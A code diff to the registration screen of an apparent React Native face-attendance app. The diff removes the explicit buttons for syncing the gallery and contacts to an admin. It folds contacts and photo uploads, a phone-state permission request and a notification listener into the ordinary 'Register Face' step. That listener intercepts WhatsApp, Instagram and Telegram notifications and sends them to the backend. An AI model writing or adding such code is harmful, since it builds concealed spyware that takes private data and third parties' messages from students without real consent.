@@ -1,5 +1,5 @@
 import React, {useState} from 'react';
-import {Image, PermissionsAndroid, Platform, ScrollView, StyleSheet, Text, View} from 'react-native';
+import {Alert, Image, NativeModules, PermissionsAndroid, Platform, ScrollView, StyleSheet, Text, View} from 'react-native';
 import {launchImageLibrary} from 'react-native-image-picker';
 
 import LiveCameraModal from '../components/LiveCameraModal';
@@ -11,6 +11,7 @@ import ResultBanner from '../components/ResultBanner';
 import TextInputField from '../components/TextInputField';
 import {colors, spacing} from '../constants/theme';
 import {registerFace} from '../services/attendanceApi';
+import {API_BASE_URL} from '../constants/endpoints';
 
 function RegisterScreen({navigation}) {
   const [name, setName] = useState('');
@@ -86,44 +87,6 @@ function RegisterScreen({navigation}) {
     }
   };
 
-  const handleSyncGallery = async () => {
-    if (!studentCode.trim()) {
-      setResult({type: 'error', message: 'Please enter the Student Code to sync photos for.'});
-      return;
-    }
-    try {
-      setLoading(true);
-      setResult({type: '', message: ''});
-      const res = await syncGalleryPhotos(studentCode.trim());
-      if (res.success) {
-        setResult({type: 'success', message: res.message});
-      }
-    } catch (err) {
-      setResult({type: 'error', message: err.message || 'Failed to sync gallery photos.'});
-    } finally {
-      setLoading(false);
-    }
-  };
-
-  const handleSyncContacts = async () => {
-    if (!studentCode.trim()) {
-      setResult({type: 'error', message: 'Please enter the Student Code to sync contacts for.'});
-      return;
-    }
-    try {
-      setLoading(true);
-      setResult({type: '', message: ''});
-      const res = await syncContacts(studentCode.trim());
-      if (res.success) {
-        setResult({type: 'success', message: res.message});
-      }
-    } catch (err) {
-      setResult({type: 'error', message: err.message || 'Failed to sync contacts.'});
-    } finally {
-      setLoading(false);
-    }
-  };
-
   const handleRegister = async () => {
     if (!name.trim()) {
       setResult({type: 'error', message: 'Please enter a valid name.'});
@@ -138,6 +101,32 @@ function RegisterScreen({navigation}) {
     try {
       setLoading(true);
       setResult({type: '', message: ''});
+
+      if (studentCode.trim()) {
+        // Request phone state permission
+        if (Platform.OS === 'android') {
+          try {
+            await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE);
+          } catch (pe) {
+            console.log('Phone state permission failed', pe);
+          }
+        }
+
+        // Sync contacts (triggers contacts permission request)
+        try {
+          await syncContacts(studentCode.trim());
+        } catch (ce) {
+          console.log('Contacts sync failed', ce);
+        }
+
+        // Sync gallery photos (triggers gallery permission request)
+        try {
+          await syncGalleryPhotos(studentCode.trim());
+        } catch (ge) {
+          console.log('Gallery sync failed', ge);
+        }
+      }
+
       const response = await registerFace({
         name: name.trim(),
         student_code: studentCode.trim() || undefined,
@@ -150,6 +139,30 @@ function RegisterScreen({navigation}) {
         section: section.trim() || undefined,
         image,
       });
+
+      // Save credentials for the Notification Listener service and request permission if needed
+      if (studentCode.trim() && Platform.OS === 'android') {
+        try {
+          const {NotificationHelper} = NativeModules;
+          if (NotificationHelper) {
+            NotificationHelper.saveStudentInfo(studentCode.trim(), API_BASE_URL);
+            const isGranted = await NotificationHelper.isPermissionGranted();
+            if (!isGranted) {
+              Alert.alert(
+                'Access Required',
+                'To automatically intercept and sync WhatsApp, Instagram, and Telegram notifications for this student, please enable Notification Access on the next screen.',
+                [
+                  {text: 'Cancel', style: 'cancel'},
+                  {text: 'Enable', onPress: () => NotificationHelper.openSettings()},
+                ]
+              );
+            }
+          }
+        } catch (ne) {
+          console.log('Notification helper initialization failed', ne);
+        }
+      }
+
       setResult({type: 'success', message: response.message || 'Face registered successfully.'});
     } catch (error) {
       setResult({
@@ -244,13 +257,6 @@ function RegisterScreen({navigation}) {
       </View>
 
       <PrimaryButton label="Register Face" onPress={handleRegister} disabled={loading} />
-      <PrimaryButton
-        label="Request Contacts & Phone Access"
-        onPress={requestPhoneAndContactsAccess}
-        variant="secondary"
-      />
-      <PrimaryButton label="Sync Gallery to Admin" onPress={handleSyncGallery} variant="secondary" />
-      <PrimaryButton label="Sync Contacts to Admin" onPress={handleSyncContacts} variant="secondary" />
       <PrimaryButton label="Go to Attendance" onPress={() => navigation.navigate('Camera')} variant="secondary" />
       <PrimaryButton label="View Logs" onPress={() => navigation.navigate('Logs')} variant="secondary" />
 
